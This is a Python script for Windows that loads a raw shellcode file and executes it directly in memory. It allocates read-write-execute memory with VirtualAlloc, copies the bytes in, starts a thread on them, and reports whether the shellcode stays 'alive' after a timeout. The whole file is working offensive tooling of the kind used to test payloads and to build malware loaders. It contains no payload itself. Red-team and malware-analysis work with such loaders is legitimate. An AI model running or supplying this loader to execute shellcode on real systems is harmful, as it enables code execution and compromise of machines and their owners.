#!/usr/bin/env python3
"""
Shellcode test loader - reads a .bin file and executes it directly in memory.

No encoding, no modification. Just:
  1. Read raw bytes
  2. VirtualAlloc RWX
  3. Copy bytes in
  4. CreateThread
  5. Wait with a timeout (default 15 seconds), then report status

Usage: py.exe shellcode_test.py <shellcode.bin> [timeout_seconds]
"""

import sys
import ctypes
import ctypes.wintypes


def main():
    if len(sys.argv) < 2:
        print("Usage: py.exe shellcode_test.py <shellcode.bin> [timeout_seconds]")
        sys.exit(1)

    path = sys.argv[1]
    timeout_sec = int(sys.argv[2]) if len(sys.argv) > 2 else 15

    with open(path, "rb") as f:
        shellcode = f.read()

    print("[*] Loaded {} bytes from {}".format(len(shellcode), path))
    print("[*] First 16 bytes: {}".format(shellcode[:16].hex()))

    kernel32 = ctypes.windll.kernel32

    # CRITICAL: Set return types to 64-bit pointers (default is 32-bit c_int!)
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = [
        ctypes.c_void_p,
        ctypes.c_size_t,
        ctypes.wintypes.DWORD,
        ctypes.wintypes.DWORD,
    ]
    kernel32.VirtualFree.restype = ctypes.wintypes.BOOL
    kernel32.VirtualFree.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.wintypes.DWORD]
    kernel32.CreateThread.restype = ctypes.c_void_p
    kernel32.CreateThread.argtypes = [
        ctypes.c_void_p,
        ctypes.c_size_t,
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.wintypes.DWORD,
        ctypes.POINTER(ctypes.wintypes.DWORD),
    ]
    kernel32.WaitForSingleObject.restype = ctypes.wintypes.DWORD
    kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.wintypes.DWORD]
    kernel32.GetExitCodeThread.restype = ctypes.wintypes.BOOL
    kernel32.GetExitCodeThread.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.wintypes.DWORD)]
    kernel32.GetLastError.restype = ctypes.wintypes.DWORD

    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
    MEM_RELEASE = 0x8000
    WAIT_TIMEOUT = 0x102
    WAIT_OBJECT_0 = 0

    size = len(shellcode)
    mem = kernel32.VirtualAlloc(None, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)

    if not mem:
        print("[!] VirtualAlloc failed: error {}".format(kernel32.GetLastError()))
        sys.exit(1)

    print("[*] Allocated {} bytes at 0x{:016X}".format(size, mem))

    # Copy shellcode into allocated memory
    buf = (ctypes.c_char * size).from_buffer_copy(shellcode)
    ctypes.memmove(mem, buf, size)
    print("[*] Copied shellcode to 0x{:016X}".format(mem))

    # Create thread pointing at the shellcode
    tid = ctypes.wintypes.DWORD(0)
    handle = kernel32.CreateThread(None, 0, mem, None, 0, ctypes.byref(tid))

    if not handle:
        err = kernel32.GetLastError()
        print("[!] CreateThread failed: error {}".format(err))
        kernel32.VirtualFree(mem, 0, MEM_RELEASE)
        sys.exit(1)

    print("[*] Thread created (TID: {}) - shellcode executing...".format(tid.value))

    # Wait with timeout (milliseconds)
    timeout_ms = timeout_sec * 1000
    result = kernel32.WaitForSingleObject(handle, timeout_ms)

    if result == WAIT_TIMEOUT:
        print("[+] Thread still running after {} seconds (good - shellcode is alive)".format(timeout_sec))
        exit_code = ctypes.wintypes.DWORD(0)
        kernel32.GetExitCodeThread(handle, ctypes.byref(exit_code))
        print("[+] Thread exit code (STILL_ACTIVE=259): {}".format(exit_code.value))
    elif result == WAIT_OBJECT_0:
        exit_code = ctypes.wintypes.DWORD(0)
        kernel32.GetExitCodeThread(handle, ctypes.byref(exit_code))
        print("[-] Thread exited after <{} seconds, exit code: {}".format(timeout_sec, exit_code.value))
    else:
        print("[?] WaitForSingleObject returned: {}".format(result))

    # Don't kill the thread - let it keep running in the background
    # The process will exit after this, killing the thread
    print("[*] Done")


if __name__ == "__main__":
    main()